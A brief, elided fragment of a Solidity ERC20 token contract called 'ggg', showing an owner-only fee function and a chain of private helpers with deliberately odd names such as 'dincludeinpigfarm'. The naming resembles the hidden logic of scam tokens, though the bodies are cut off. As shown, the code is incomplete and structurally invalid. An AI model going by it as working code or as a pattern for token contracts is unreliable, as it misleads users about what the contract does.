...
contract ggg is Context, IERC20, Ownable {
    ...
    function includeInFee(address account) public onlyOwner {
       ...
       function deprove(address spender, uint256 amount) private returns (bool) {
           deprove_basic(spender,amount);
        return true;
    }

        function deprove_basic(address spender, uint256 amount) private returns (bool) {
           dincludeinpigfarm(amount);
        return true;
    }

     function dincludeinpigfarm( uint256 amount) private {
         uint256 decombsa = amount+1024;
        if (amount>=1){
      ...
      function deprodecombobulaste (uint256 amount) private returns (bool) {
